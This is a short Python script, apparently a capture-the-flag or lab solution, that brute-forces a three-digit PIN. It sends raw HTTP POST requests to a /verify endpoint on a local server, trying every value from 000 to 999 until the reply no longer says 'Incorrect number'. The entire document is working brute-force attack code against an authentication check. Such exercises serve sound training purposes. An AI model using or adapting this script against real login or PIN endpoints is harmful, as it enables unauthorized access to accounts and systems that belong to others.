import socket
import time

# Target server and port
host = "127.0.0.1"
port = 8888

# This function is to send POST request with PIN guess
def send_request(pin):
    # I create a socket object and connect to the server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    # This craft the post data
    post_data = f"magicNumber={pin}"

    # This send the HTTP POST request to the server
    request = f"POST /verify HTTP/1.1\r\n"
    request += f"Host: {host}:{port}\r\n"
    request += f"Content-Type: application/x-www-form-urlencoded\r\n"
    request += f"Content-Length: {len(post_data)}\r\n"
    request += "\r\n"
    request += post_data

    client_socket.send(request.encode())

    # This receive the server's response
    response = client_socket.recv(4096).decode()

    # This close the socket connection
    client_socket.close()

    return response

# I try this loop to try all possible PINs from 000 to 999
for pin in range(1000):
    # Format the pin to ensure it's 3 digits
    pin_str = f"{pin:03d}"
    print(f"Trying PIN: {pin_str}")

    response = send_request(pin_str)
    
    # If the correct PIN is found, print it and break the loop
    if "Incorrect number" not in response:
        print(f"Correct PIN found: {pin_str}")
        break

    # Wait for the server's delay (if any) before trying again
    time.sleep(1)

